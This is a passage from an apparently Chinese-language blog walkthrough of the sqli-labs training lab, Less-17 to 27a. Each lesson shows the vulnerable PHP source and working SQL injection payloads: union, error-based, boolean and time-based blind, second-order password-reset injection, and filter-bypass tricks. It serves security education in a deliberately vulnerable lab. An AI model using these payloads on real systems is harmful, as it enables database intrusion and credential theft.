--+&amp;uname=Dumb<br><br></code></pre></td></tr></table></figure><p>时间盲注 Payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&#x27;  WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;Dumb&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(1, sleep(3), 2) --+&amp;<span class="hljs-attribute">uname</span>=Dumb # 明显延时<br><span class="hljs-attribute">passwd</span>=Dumb&#x27;  WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;Dumb&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(0, sleep(3), 2) --+&amp;<span class="hljs-attribute">uname</span>=Dumb<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>闭合方式：<code>VALUES (&#39;$uagent&#39;)</code>（两侧闭合）</p><p>登陆之后，发现查询到的信息是 User-agent，尝试在 Hackbar 添加 Header。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/65A5263E-2378-4E6B-BAEF-B7C5F43C18A9.png"><br>发现报错信息，说明可以采用报错注入的方式获得回显信息。</p><p>尝试闭合SQL语句</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) --+<br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) #<br><span class="hljs-number">1</span>&#x27; and sleep(<span class="hljs-number">3</span>) %<span class="hljs-number">23</span><br><br></code></pre></td></tr></table></figure><p>并没有收获</p><p>查看源码后发现 password 和 username 都被上一题的检查函数所检查，而 User-agent 在另一个 SQL 语句（插入数据）中，所以不管怎么包裹都无法在 INSERT 语句中得到回显。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8BF2BB30-E839-4B64-AF48-5BD66400980E.png"><br>故需要换一种闭合方式（在两侧进行闭合）</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali"><br>&#x27;<span class="hljs-built_in"> and </span>sleep(3)<span class="hljs-built_in"> and </span>&#x27;<br><br></code></pre></td></tr></table></figure><p>将 INSERT 语句闭合成</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`security`</span>.<span class="hljs-symbol">`uagents`</span> (<span class="hljs-symbol">`uagent`</span>, <span class="hljs-symbol">`ip_address`</span>, <span class="hljs-symbol">`username`</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-string">&#x27;Dumb&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>uagent 字段就会被插入’’和’’进行与运算的结果（即0）</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; select &#x27;&#x27; and sleep(3) and &#x27;<span class="hljs-emphasis">&#x27;;</span><br><span class="hljs-emphasis">+------------------------+</span><br><span class="hljs-emphasis">| &#x27;</span>&#x27; and sleep(3) and &#x27;&#x27; |<br><span class="hljs-code">+------------------------+</span><br>|                      0 |<br><span class="hljs-code">+------------------------+</span><br>1 row in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>报错注入payload</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>) and &#x27;<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>闭合方式：<code>VALUES (&#39;$uagent&#39;)</code>（两侧闭合）</p><p>同上题配置，仅字段不同，报错注入 Payload<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B2E0F540-D020-4071-8CEC-6350DF9B793E.png"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>) and &#x27;<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>闭合方式：<code>username=&#39;$cookee&#39;</code></p><p>推荐插件 <code>EditThisCookie</code></p><p>登陆之后，网页中存储了键为 Dumb、值为 Dumb的 Cookie。修改 Cookie 值之后，进行刷新就能看见报错信息</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br><span class="hljs-comment"># 修改Cookie的值为</span><br>Dumb<span class="hljs-string">&#x27; #</span><br><span class="hljs-string"># 这里不能使用 --+。原因：+ 号在 Cookie 中不会被 URL 解码为空格可以采用下面这种方式。</span><br><span class="hljs-string">Dumb&#x27;</span>--%<span class="hljs-number">20</span><br><br><br><span class="hljs-comment"># 测试回显的字段</span><br>Dum<span class="hljs-string">&#x27; union select 1, 2, 3--%20</span><br><span class="hljs-string"># 查看数据库</span><br><span class="hljs-string">Dum&#x27;</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1, 2, <span class="hljs-title">database</span>()--%20</span><br><br></code></pre></td></tr></table></figure><p>联合注入 Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dum</span>&#x27; union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, database()--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><p>报错注入 Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dum</span>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, database(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><p>布尔盲注 Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dumb</span>&#x27; and if(database()=&#x27;security&#x27;, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><p>时间盲注 Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Dumb</span>&#x27; and if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>)--%<span class="hljs-number">20</span><br><br></code></pre></td></tr></table></figure><hr><h1 id="3-高级注入-21-37"><a href="#3-高级注入-21-37" class="headerlink" title="3 高级注入(21-37)"></a>3 高级注入(21-37)</h1><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>闭合方式：<code>username=(&#39;$cookee&#39;)</code></p><p>关键词：cookie、base64加密、单引号和括号</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-comment"># 进行简单的闭合</span><br><span class="hljs-attribute">Dumb</span>&#x27;) #<br><span class="hljs-comment"># base64加密后：RHVtYicpICM=</span><br><br><span class="hljs-comment"># Union注入Payload</span><br><span class="hljs-attribute">Dum</span>&#x27;) union select <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>#<br><br><span class="hljs-comment"># 报错注入Payload</span><br><span class="hljs-attribute">Dum</span>&#x27;) and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, database(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)-- （最后有一个空格，也可以使用#）<br><span class="hljs-comment"># base64加密后：RHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0g</span><br><span class="hljs-comment"># 没有空格加密后：RHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0=</span><br><br><span class="hljs-comment"># 时间盲注Payload</span><br><span class="hljs-attribute">Dumb</span>&#x27;) and if(database()=&#x27;security&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">0</span>)#<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>闭合方式： <code>username=&quot;$cookee&quot;</code></p><p>关键词：cookie、base64加密、双引号</p><p>同上一题，将单引号和括号改为双引号即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment"># Union注入Payload</span><br><span class="hljs-string">Dum&quot;</span> <span class="hljs-string">union</span> <span class="hljs-string">select</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-number">3</span><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：基于错误、过滤注释</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br># 尝试进行闭合（注释被替换成为空）<br>?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-keyword">and</span> &#x27;<span class="hljs-number">1</span><br><br># 国光大师傅的Payload：<br>?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(SELECT(@<span class="hljs-params">x</span>:=0x00)</span> ,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(<span class="hljs-params">users</span>)</span><span class="hljs-constructor">WHERE(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">IN(@<span class="hljs-params">x</span>:=CONCAT(0x20,@<span class="hljs-params">x</span>,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>,0x3c62723e)</span>)))x),<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-character">&#x27;1&#x27;</span>=&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-comment">//filter the comments out so as to comments should not work</span><br>$reg = <span class="hljs-string">&quot;/#/&quot;</span>;<br>$reg1 = <span class="hljs-string">&quot;/--/&quot;</span>;<br>$replace = <span class="hljs-string">&quot;&quot;</span>;<br>$id = preg_replace($reg, $replace, $id);<br>$id = preg_replace($reg1, $replace, $id);<br><br></code></pre></td></tr></table></figure><p>正如源码所示，将 # 和 – 替换为空，所以可以采用闭合的方式进行注入。</p><hr><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>关键词：经典二次注入、存储注入</p><p>二次注入通常在注册的位置，插入数据的时候不会产生错误信息，但是在执行其他语句的时候发生了错误。<br>（第一次是向数据库插入Payload，第二次是利用Payload）</p><p>Update语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span><br><br></code></pre></td></tr></table></figure><p>当用户名为 admin’# 时，sql 语句会变成</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-builtin-name">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;admin&#x27;</span># <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span><br><br></code></pre></td></tr></table></figure><p>这样就会修改 admin 的密码，而不是我自己注册的账号。</p><p>通过这个页面 <a href="http://localhost:4000/Less-24">http://localhost:4000/Less-24</a> 进入注册页面失败，发现是文件路径未找到。在后面填加 index 之后就正常执行了，即访问：<a href="http://localhost:4000/Less-24/index.php%E3%80%82">http://localhost:4000/Less-24/index.php。</a></p><p>注册新用户<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/5B29A116-C50E-4DB1-A821-6345CC7FB629.png"><br>在修改页面进行密码修改，即可修改 admin 的密码。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8EBA386F-FB14-45C1-AE56-1D196A017E6B.png"></p><hr><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：GET 类型、过滤 and+or。</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params">$id</span>)</span><br><span class="hljs-function"></span>&#123;<br>    $id= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);            <span class="hljs-comment">//strip out OR (non case sensitive)</span><br>    $id= preg_replace(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);        <span class="hljs-comment">//Strip out AND (non case sensitive)</span><br>    <br>    <span class="hljs-keyword">return</span> $id;<br>&#125;<br><br>$id= blacklist($id);<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>这里的 or 和 and 只被替换了一次，所以可以采用双写绕过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 联合注入 Payload</span><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(username,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>)<span class="hljs-comment">--+</span><br><span class="hljs-comment"># 其中 password 改为 passwoord，separator 改为 separatoorr（设置分隔符），0x3c62723e 是十六进制的&lt;br&gt;</span><br><br></code></pre></td></tr></table></figure><p>and 可以使用 &amp;&amp; 替换，or 使用 || 替换</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 报错注入Payload<br>?id=<span class="hljs-number">1</span>&#x27;||extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database()))--+<br>?id=<span class="hljs-number">1</span>&#x27;||extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>)+FROM+users)))--+<br><br></code></pre></td></tr></table></figure><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>关键词：报错注入、过滤空格和注释符、过滤 and 和 or、单引号</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment"># 过滤了 or 和 and 大小写</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-regexp">//</span>strip out OR (non case sensitive)<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out AND (non case sensitive)<br><br><br><span class="hljs-comment"># 过滤了 /*</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>strip out /*<br><br><br><span class="hljs-comment"># 过滤了 -- 和 # 注释</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out --<br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-regexp">//</span>Strip out <span class="hljs-comment">#</span><br><br><br><span class="hljs-comment"># 过滤了空格</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out spaces<br><br><br><span class="hljs-comment"># 过滤了斜线</span><br><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-regexp">//</span>Strip out slashes<br>return <span class="hljs-variable">$id</span>;<br><br></code></pre></td></tr></table></figure><ul><li>过滤 or 和 and：可以用 &amp;&amp; 和 || 替换或者采用双写的方式绕过</li><li>过滤空格：可以用下表的字符进行替换<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haml"><br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> TAB 键(水平) <br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> 新建一行 <br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> 新的一页 <br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return 功能 <br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> TAB 键(垂直) <br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 空格 <br><br></code></pre></td></tr></table></figure></li><li>过滤注释：可以用两侧闭合方式绕过。例如：less-23<br>可以构建 Payload 得：<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 测试是否可以执行<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br># 其中%<span class="hljs-number">26</span>是&amp;，使用两侧闭合方式绕过注释<br><br># 报错注入Payload<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database()))%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>关键词：盲注、布尔注入、延时注入</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br># 返回结果相同，成功闭合SQL语句<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>关键词：基于错误、过滤 Union 和 Select</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 测试能否闭合<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>sleep(<span class="hljs-number">3</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><ul><li>过滤 Union 和 select：采用双写绕过（原理同 or 和 and）、采用大小写混合绕过（MySQL对大小写并不敏感）<br>关键代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment"># 过滤了 /*</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># 过滤了 -</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># 过滤了 #</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># 过滤了空格</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><br><br><span class="hljs-comment"># 过滤了 union UNION</span><br>$id= preg_replace(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br>$id= preg_replace(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, $id);<br><span class="hljs-keyword">return</span> $id;<br><br></code></pre></td></tr></table></figure>进行报错注入（类似 less-26）<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># 报错注入 Payload<br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database()))%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br>?id=<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, seleselectct database()))%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p><p>同 less-27，闭合方式不同。没有输出报错信息，所以不能报错注入。关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$id = <span class="hljs-string">&#x27;&quot;&#x27;</span> .$id. <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 